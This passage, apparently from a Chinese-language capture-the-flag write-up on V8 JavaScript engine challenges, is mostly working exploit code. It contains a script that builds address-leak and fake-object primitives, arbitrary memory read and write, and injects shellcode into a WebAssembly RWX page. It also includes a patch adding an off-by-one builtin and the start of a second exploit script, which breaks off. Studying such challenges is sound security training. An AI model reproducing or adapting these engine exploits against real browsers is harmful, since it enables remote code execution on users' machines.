function_">log</span>(<span class="string">&#x27;[*] Map addr for obj_arr:&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj_arr_map_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*] Prototype for obj_arr:&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj_arr_prototype.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*] Map addr for float_arr:&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(float_arr_map_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*] Prototype for float_arr:&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(float_arr_prototype.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//%DebugPrint(obj_arr);</span></span><br><span class="line"><span class="comment">//%DebugPrint(trojan_arr);</span></span><br><span class="line"><span class="comment">//%DebugPrint(float_arr);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get32addr</span>(<span class="params">object</span>)&#123;</span><br><span class="line">	obj_arr[<span class="number">0</span>] = object;</span><br><span class="line">	trojan_arr[<span class="number">0x17</span>] = <span class="title function_">u2f</span>(float_arr_map_addr+<span class="number">1</span>, float_arr_prototype);</span><br><span class="line">	addr = obj_arr[<span class="number">0</span>];</span><br><span class="line">	obj_arr[<span class="number">0</span>] = sample_obj;</span><br><span class="line">	trojan_arr[<span class="number">0x17</span>] = <span class="title function_">u2f</span>(obj_arr_map_addr+<span class="number">1</span>, obj_arr_prototype);</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">f2ul</span>(addr)-<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getfakeobject</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">	float_arr[<span class="number">0</span>] = <span class="title function_">u2f</span>(addr+<span class="number">1</span>, obj_arr_map_addr+<span class="number">1</span>);</span><br><span class="line">	float_arr[<span class="number">0x3</span>] = <span class="title function_">u2f</span>(obj_arr_map_addr+<span class="number">1</span>, obj_arr_prototype);</span><br><span class="line">	cur_fake_obj = float_arr[<span class="number">0</span>];</span><br><span class="line">	float_arr[<span class="number">0</span>] = <span class="number">1.1</span>;</span><br><span class="line">	float_arr[<span class="number">0x3</span>] = <span class="title function_">u2f</span>(float_arr_map_addr+<span class="number">1</span>, float_arr_prototype);</span><br><span class="line">	<span class="keyword">return</span> cur_fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">get32addr</span>(a).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//%DebugPrint(a);</span></span><br><span class="line">new_a = <span class="title function_">getfakeobject</span>(<span class="title function_">get32addr</span>(a));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(new_a);</span><br><span class="line">new_a[<span class="number">2</span>]=<span class="number">13.37</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> fake = [<span class="title function_">i2f</span>(<span class="number">0x31040404001c01b5n</span>), <span class="title function_">i2f</span>(<span class="number">0x0a0007ff11000844n</span>)]; <span class="comment">//fake a map: 0x31040404001c01b5	0x0a0007ff11000844</span></span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">ELEMENT_OFFSET</span> = <span class="number">0x20</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">MAP_OFFSET</span> = <span class="number">0x24</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">WASM_PAGE_SIZE</span> = <span class="number">0x2c0a0</span>;</span><br><span class="line"></span><br><span class="line">arr_element_addr = <span class="title function_">get32addr</span>(arr)-<span class="variable constant_">ELEMENT_OFFSET</span>; <span class="comment">//element</span></span><br><span class="line">fake_map_addr = <span class="title function_">get32addr</span>(fake)+<span class="variable constant_">MAP_OFFSET</span>; <span class="comment">//map</span></span><br><span class="line">fake_array = [<span class="title function_">u2f</span>(fake_map_addr+<span class="number">1</span>, <span class="number">750</span>), <span class="title function_">u2f</span>(arr_element_addr+<span class="number">1</span>, <span class="number">100</span>)]; <span class="comment">//map, properties, elements, len</span></span><br><span class="line">fake_obj = <span class="title function_">getfakeobject</span>(<span class="title function_">get32addr</span>(fake_array)+<span class="variable constant_">MAP_OFFSET</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ArbRead64</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">	addr -= <span class="number">8</span>;</span><br><span class="line">	fake_array[<span class="number">1</span>] = <span class="title function_">u2f</span>(addr+<span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">f2i</span>(fake_obj[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ArbWrite64</span>(<span class="params">addr, value</span>)&#123;</span><br><span class="line">	addr -= <span class="number">8</span>;</span><br><span class="line">	fake_array[<span class="number">1</span>] = <span class="title function_">u2f</span>(addr+<span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line">	fake_obj[<span class="number">0</span>] = <span class="title function_">i2f</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">ArbRead64</span>(arr_element_addr).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="title class_">ArbWrite64</span>(arr_element_addr, <span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">ArbRead64</span>(arr_element_addr).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_mod);</span><br><span class="line"><span class="keyword">var</span> f = wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> shellcode = [<span class="title function_">i2f</span>(<span class="number">0x9090909090909090n</span>),<span class="title function_">i2f</span>(<span class="number">0x2434810101666068n</span>),<span class="title function_">i2f</span>(<span class="number">0x6567b84801010101n</span>),<span class="title function_">i2f</span>(<span class="number">0x48506c667461632fn</span>),<span class="title function_">i2f</span>(<span class="number">0x656c6c6168632fb8n</span>),<span class="title function_">i2f</span>(<span class="number">0x31d231e78948506en</span>),<span class="title function_">i2f</span>(<span class="number">0x0000050f583b6af6n</span>)];</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = <span class="title class_">ArbRead64</span>(<span class="title function_">get32addr</span>(wasm_instance)+<span class="variable constant_">WASM_PAGE_SIZE</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*] WASM Instance ADDR:&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">get32addr</span>(wasm_instance).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//console.log(GetAddressOf(fake).toString(16));</span></span><br><span class="line"><span class="comment">//console.log(GetAddressOf(arr).toString(16));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(shellcode.<span class="property">length</span> * <span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> dataview = <span class="keyword">new</span> <span class="title class_">DataView</span>(buf);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// move dataview to RWX memory</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*] BUF ADDR:&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> buf_addr = <span class="title function_">get32addr</span>(buf);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(buf_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> backing_store_pointer = buf_addr + <span class="number">0x24</span>;</span><br><span class="line">backing_store_addr = <span class="title class_">ArbRead64</span>(backing_store_pointer);</span><br><span class="line"><span class="comment">//caculate full rwx addr</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*] RWX PAGE ADDR:&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(rwx_page_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(backing_store_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//ArbWrite64(backing_store_pointer, backing_store_addr);</span></span><br><span class="line"><span class="title class_">ArbWrite64</span>(backing_store_pointer,rwx_page_addr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">ArbRead64</span>(backing_store_pointer).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="comment">//%DebugPrint(buf);</span></span><br><span class="line"><span class="comment">//%DebugPrint(wasm_instance);</span></span><br><span class="line"><span class="comment">//%DebugPrint(arr);</span></span><br><span class="line"><span class="comment">//%DebugPrint(fake);</span></span><br><span class="line"><span class="comment">//%DebugPrint(fake_obj);</span></span><br><span class="line"><span class="comment">// copy shellcode</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    dataview.<span class="title function_">setFloat64</span>(<span class="number">8</span> * i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// jump to RWX memory</span></span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//%DebugPrint(arr);</span></span><br><span class="line"><span class="comment">//%DebugPrint(fake);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><p>給了一個 offbyone 可以任意控制 element len 位置的資料。<br><strong>patch</strong>  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">+BUILTIN(ArrayOffByOne) &#123;</span><br><span class="line">+	HandleScope <span class="title function_">scope</span><span class="params">(isolate)</span>;</span><br><span class="line">+	Factory *factory = isolate-&gt;factory();</span><br><span class="line">+	Handle&lt;Object&gt; receiver = args.receiver();</span><br><span class="line">+</span><br><span class="line">+	<span class="keyword">if</span> (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, Cast&lt;JSArray&gt;(*receiver))) &#123;</span><br><span class="line">+	  THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span><br><span class="line">+    	factory-&gt;NewStringFromAsciiChecked(<span class="string">&quot;Nope&quot;</span>)));</span><br><span class="line">+	&#125;</span><br><span class="line">+</span><br><span class="line">+	Handle&lt;JSArray&gt; <span class="built_in">array</span> = Cast&lt;JSArray&gt;(receiver);</span><br><span class="line">+</span><br><span class="line">+	ElementsKind kind = <span class="built_in">array</span>-&gt;GetElementsKind();</span><br><span class="line">+</span><br><span class="line">+	<span class="keyword">if</span> (kind != PACKED_DOUBLE_ELEMENTS) &#123;</span><br><span class="line">+	  THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span><br><span class="line">+    	factory-&gt;NewStringFromAsciiChecked(<span class="string">&quot;Need an array of double numbers&quot;</span>)));</span><br><span class="line">+	&#125;</span><br><span class="line">+</span><br><span class="line">+	<span class="keyword">if</span> (args.length() &gt; <span class="number">2</span>) &#123;</span><br><span class="line">+	  THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span><br><span class="line">+    	factory-&gt;NewStringFromAsciiChecked(<span class="string">&quot;Too many arguments&quot;</span>)));</span><br><span class="line">+	&#125;</span><br><span class="line">+	</span><br><span class="line">+	Handle&lt;FixedDoubleArray&gt; <span class="title function_">elements</span><span class="params">(Cast&lt;FixedDoubleArray&gt;(<span class="built_in">array</span>-&gt;elements()), isolate)</span>;</span><br><span class="line">+	<span class="type">uint32_t</span> len = static_cast&lt;<span class="type">uint32_t</span>&gt;(Object::NumberValue(<span class="built_in">array</span>-&gt;length()));</span><br><span class="line">+	<span class="keyword">if</span> (args.length() == <span class="number">1</span>) &#123;	<span class="comment">// read mode</span></span><br><span class="line">+		<span class="keyword">return</span> *(isolate-&gt;factory()-&gt;NewNumber(elements-&gt;get_scalar(len)));</span><br><span class="line">+	&#125; <span class="keyword">else</span> &#123;	<span class="comment">// write mode</span></span><br><span class="line">+		Handle&lt;Object&gt; value = args.at(<span class="number">1</span>);</span><br><span class="line">+		<span class="keyword">if</span> (!IsNumber(*value)) &#123;</span><br><span class="line">+		  THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span><br><span class="line">+    		factory-&gt;NewStringFromAsciiChecked(<span class="string">&quot;Need a number argument&quot;</span>)));</span><br><span class="line">+		&#125;</span><br><span class="line">+		<span class="type">double</span> num = static_cast&lt;<span class="type">double</span>&gt;(Object::NumberValue(*value));</span><br><span class="line">+		elements-&gt;<span class="built_in">set</span>(len, num);</span><br><span class="line">+		<span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+	&#125;</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br></pre></td></tr></table></figure>

<p>根據前面的經驗，這次應該就是要想辦法透過一個 oob 拿到任意控制長度對吧…<br>這次用了一個特別的技巧，讓程式進入 JIT 模式，使得其優化記憶體空間方便我們做一些操作（像是算 OFFSET）！  </p>
<p>在進入 JIT 後，element len index 紀錄的不再是自己的 property &#x2F; map pointers 而是下一個物件的。  </p>
<p>回顧一下 property：<a target="_blank" rel="noopener" href="https://v8.dev/blog/fast-properties">https://v8.dev/blog/fast-properties</a><br>總之，一開始定義好(像是<code>a = &#123;meow:1&#125;</code>)的東西(<code>meow</code>)叫做 In-object ，會直接綁在物件裡，而後面定義的則會更新到 property 指向的地址建立一個 Chain！<br>這時候如果 property 地址可控，而且更重要的是前面提及的 JIT 後會讓 property 地址和其他物件的地址近很多(offset 幾乎固定)，把它蓋成一個 array 的地址（透過 offbyone 拿到的 property 地址算），再去把相應 layout ，本來應該是 array len 的 property 改成一個大數就拿到前面的 array len 任意寫惹 w  </p>
<p>後面就跟前面一樣步驟，不贅述 -w-  </p>
<p><strong>sol.js</strong>  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> uv = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(ab);</span><br><span class="line"><span class="keyword">let</span> dv = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(ab);</span><br><span class="line"><span class="keyword">let</span> fv = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>) &#123;</span><br><span class="line">    fv[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> dv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>) &#123;</span><br><span class="line">    dv[<span class="number">0</span>] = <span class="title class_">BigInt</span>(i);</span><br><span class="line">    <span class="keyword">return</span> fv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2f</span>(<span class="params">i, j</span>)&#123;</span><br><span class="line">    uv[<span class="number">0</span>]=i;</span><br><span class="line">    uv[<span class="number">1</span>]=j;</span><br><span class="line">    <span class="keyword">return</span> fv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2ul</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    fv[<span class="number">0</span>]=i;</span><br><span class="line">    <span class="keyword">return</span> uv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2uh</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    fv[<span class="number">0</span>]=i;</span><br><span class="line">    <span class="keyword">return</span> uv[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shift32</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> i&lt;&lt;<span class="number">32n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">last32</span>(<span class="params">i</span>)&#123;</span><br><span class="line">    dv[<span class="number">0</span>]=i;</span><br><span class="line">    <span class="keyword">return</span> uv[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">to_jit</span>(<span class="params"></span>)&#123;<span class="keyword">return</span> [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>, <span class="number">6.6</span>, <span class="number">7.7</span>];&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100000</span>;i++)&#123;<span class="title function_">to_jit</span>();&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//let a = [1.1];</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> trojan_arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">let</span> tmp_obj1 = &#123;<span class="string">&#x27;meow&#x27;</span>:<span class="number">1</span>&#125;;</span><br><span class="line">tmp_obj1.<span class="property">fake_element</span> = <span class="number">2</span>;</span><br><span class="line">tmp_obj1.<span class="property">fake_len</span> = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">let</span> sample_obj = &#123;trojan_arr&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj_arr = [sample_obj];</span><br><span class="line"><span class="keyword">let</span> float_arr = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">let</span> tmp_obj2 = &#123;<span class="string">&#x27;origin&#x27;</span>:<span class="number">1</span>&#125;;</span><br><span class="line">tmp_obj2.<span class="property">fake_element</span> = <span class="number">2</span>;</span><br><span class="line">tmp_obj2.<span class="property">fake_len</span> = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*] Set length to trojan_arr&#x27;</span>);</span><br><span class="line">trojan_arr.<span class="title function_">offByOne</span>(<span class="title function_">u2f</span>(<span class="title function_">f2ul</span>(trojan_arr.<span class="title function_">offByOne</span>()), <span class="title function_">f2uh</span>(trojan_arr.<span class="title function_">offByOne</span>())-<span class="number">0x84</span>));</span><br><span class="line">tmp_obj1.<span class="property">fake_len</span>=<span class="number">0x10000</span>;</span><br><span class="line"><span class="comment">//%DebugPrint(trojan_arr);</span></span><br><span class="line"><span class="comment">//console.log(f2i(float_arr.offByOne()).toString(16));</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*] Set length to float_arr&#x27;</span>);</span><br><span class="line">float_arr.<span class="title function_">offByOne</span>(<span class="title function_">u2f</span>(<span class="title function_">f2ul</span>(float_arr.<span class="title function_">offByOne</span>()), <span class="title function_">f2uh</span>(float_arr.<span class="title function_">offByOne</span>())-<span class="number">0x7c</span>));</span><br><span class="line">tmp_obj2.<span class="property">fake_len</span>=<span class="number">0x10000</span>;</span><br><span class="line"><span class="comment">//%DebugPrint(float_arr);</span></span><br><span class="line"><span class="comment">//%DebugPrint(obj_arr);</span></span><br><span class="line"><span class="comment">//trojan_arr.setLength(0x20);</span></span><br><span class="line"><span class="comment">//float_arr.setLength(4);</span></span><br><span class="line"><span class="comment">//while(1)&#123;&#125;;</span></span><br><span class="line"><span class="comment">//I hate this bad offset</span></span><br><span class="line">before_obj_arr_map_addr = <span class="title function_">f2ul</span>(trojan_arr[<span class="number">0x1d</span>]);</span><br><span class="line">obj_arr_map_addr = <span class="title function_">f2uh</span>(trojan_arr[<span class="number">0x1d</span>])-<span class="number">1</span>;</span><br><span class="line">obj_arr_prototype = <span class="title function_">f2ul</span>(trojan_arr[<span class="number">0x1e</span>]);</span><br><span class="line">after_obj_arr_prototype = <span class="title function_">f2uh</span>(trojan_arr[<span class="number">0x1e</span>]);</span><br><span class="line"></span><br><span class="line">float_arr_map_addr = <span class="title function_">f2ul</span>(trojan_arr[<span class="number">0x24</span>])-<span class="number">1</span>;</span><br><span class="line">float_arr_prototype = <span class="title function_">f2uh</span>(trojan_arr[<span class="number">0x24</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;[*] Map addr for 